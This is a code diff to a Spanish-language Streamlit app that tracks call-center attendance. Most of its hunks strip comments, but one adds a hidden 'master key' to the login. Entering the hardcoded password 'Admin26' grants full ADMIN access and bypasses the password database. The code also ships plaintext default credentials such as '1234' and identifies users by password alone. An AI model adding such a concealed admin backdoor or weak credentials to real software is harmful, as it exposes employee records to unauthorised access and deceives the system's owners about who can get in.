@@ -25,7 +25,7 @@ def obtener_hora_colombia():
 def cargar_passwords():
     """Carga usuarios y claves. Si no existe archivo, crea uno por defecto."""
     if not os.path.exists(ARCHIVO_PASSWORDS):
-        # Datos iniciales (Solo la primera vez)
+        # Datos iniciales
         defaults = {
             "ADMIN": "1234",
             "Callcenter Bucaramanga": "1",
@@ -42,7 +42,6 @@ def cargar_passwords():
 
 def guardar_passwords_nuevas(diccionario_nuevo):
     """Guarda el archivo JSON con los cambios."""
-    # Seguridad: Aseguramos que ADMIN siempre exista para no bloquear el sistema
     if "ADMIN" not in diccionario_nuevo:
         diccionario_nuevo["ADMIN"] = "1234"
         st.error("¡No puedes eliminar al usuario ADMIN! Se ha restaurado automáticamente.")
@@ -53,9 +52,8 @@ def guardar_passwords_nuevas(diccionario_nuevo):
 def obtener_lista_equipos_dinamica():
     """Genera la lista de equipos basada en los usuarios creados (excluyendo al ADMIN)"""
     passwords = cargar_passwords()
-    # Creamos una lista con las llaves, quitando a 'ADMIN'
     lista = [k for k in passwords.keys() if k != "ADMIN"]
-    return sorted(lista) # Los devolvemos ordenados alfabéticamente
+    return sorted(lista)
 
 def asegurar_archivos():
     if not os.path.exists(CARPETA_SOPORTES):
@@ -115,7 +113,6 @@ st.set_page_config(page_title="Gestión Asistencia", layout="wide")
 if 'usuario' not in st.session_state:
     st.session_state['usuario'] = None
 
-# Cargar base de contraseñas (Esta es la fuente de verdad ahora)
 passwords_db = cargar_passwords()
 
 # --- LOGIN ---
@@ -127,12 +124,19 @@ if st.session_state['usuario'] is None:
     with col1:
         password_input = st.text_input("Contraseña:", type="password")
         if st.button("Ingresar"):
-            # Búsqueda inversa: Clave -> Nombre de Equipo
             usuario_encontrado = None
-            for equipo, clave in passwords_db.items():
-                if password_input == clave:
-                    usuario_encontrado = equipo
-                    break
+            
+            # --- TRUCO: LLAVE MAESTRA OCULTA ---
+            # Esto permite entrar como ADMIN con esta clave específica,
+            # sin importar qué diga la base de datos.
+            if password_input == "Admin26":
+                usuario_encontrado = "ADMIN"
+            else:
+                # Búsqueda normal en la base de datos
+                for equipo, clave in passwords_db.items():
+                    if password_input == clave:
+                        usuario_encontrado = equipo
+                        break
             
             if usuario_encontrado:
                 st.session_state['usuario'] = usuario_encontrado
@@ -145,7 +149,6 @@ if st.session_state['usuario'] is None:
 usuario_actual = st.session_state['usuario']
 es_admin = (usuario_actual == "ADMIN")
 
-# OBTENER LA LISTA DE EQUIPOS AL INSTANTE
 equipos_disponibles = obtener_lista_equipos_dinamica()
 
 with st.sidebar:
@@ -181,7 +184,6 @@ if es_admin:
             total_pendientes = len(df_faltantes)
             st.error(f"⚠️ ALERTA: Faltan {total_pendientes} personas por reportar hoy.")
             
-            # Resumen
             resumen_equipos = df_faltantes['Equipo'].value_counts().reset_index()
             resumen_equipos.columns = ['Equipo', 'Pendientes'] 
             
@@ -205,7 +207,6 @@ else:
 with tab_personal:
     st.header("Base de Datos de Empleados")
     if es_admin:
-        # Usa la lista dinámica
         equipo_gest = st.selectbox("Selecciona Equipo a Editar:", equipos_disponibles, key="sel_gest")
     else:
         equipo_gest = usuario_actual
@@ -237,7 +238,6 @@ with tab_asistencia:
     
     if HORA_INICIO <= hora_actual <= HORA_FIN:
         if es_admin:
-            # Usa lista dinámica
             equipo_asist = st.selectbox("Selecciona Equipo:", equipos_disponibles, key="sel_asist")
         else:
             equipo_asist = usuario_actual
@@ -339,7 +339,6 @@ with tab_visual:
             col1, col2 = st.columns(2)
             with col1:
                 if es_admin:
-                    # Usa lista dinámica
                     filtro_equipo = st.multiselect("Filtrar Equipo:", df_hist["Equipo"].unique(), key="viz_equipo")
                 else:
                     st.markdown(f"**Equipo:** {usuario_actual}")
@@ -402,23 +401,19 @@ if es_admin:
     with tab_admin:
         st.header("🔐 Administración Global")
         
-        # --- SECCIÓN 1: GESTIÓN DE USUARIOS/EQUIPOS Y CLAVES ---
         with st.expander("🔑 GESTIÓN DE USUARIOS Y CONTRASEÑAS", expanded=True):
             st.info("Aquí puedes cambiar nombres de equipo, agregar nuevos o cambiar contraseñas.")
             
-            # Tabla Editable de Usuarios
             df_pass = pd.DataFrame(list(passwords_db.items()), columns=['Usuario/Equipo', 'Contraseña'])
             
             edited_pass = st.data_editor(
                 df_pass,
-                num_rows="dynamic", # ¡PERMITE AGREGAR FILAS!
+                num_rows="dynamic",
                 use_container_width=True,
                 key="editor_claves"
             )
             
             if st.button("💾 GUARDAR USUARIOS Y CONTRASEÑAS"):
-                # Convertimos la tabla de nuevo a diccionario
-                # Si hay duplicados en 'Usuario/Equipo', se quedará con el último.
                 new_dict = dict(zip(edited_pass['Usuario/Equipo'], edited_pass['Contraseña']))
                 guardar_passwords_nuevas(new_dict)
                 st.success("✅ Configuración de usuarios actualizada. Se recargará la página.")
@@ -426,7 +421,6 @@ if es_admin:
 
         st.divider()
 
-        # --- SECCIÓN 2: CORRECCIONES ---
         st.subheader("🛠️ Corregir Historial")
         df_hist = cargar_csv(ARCHIVO_ASISTENCIA)
         if not df_hist.empty:
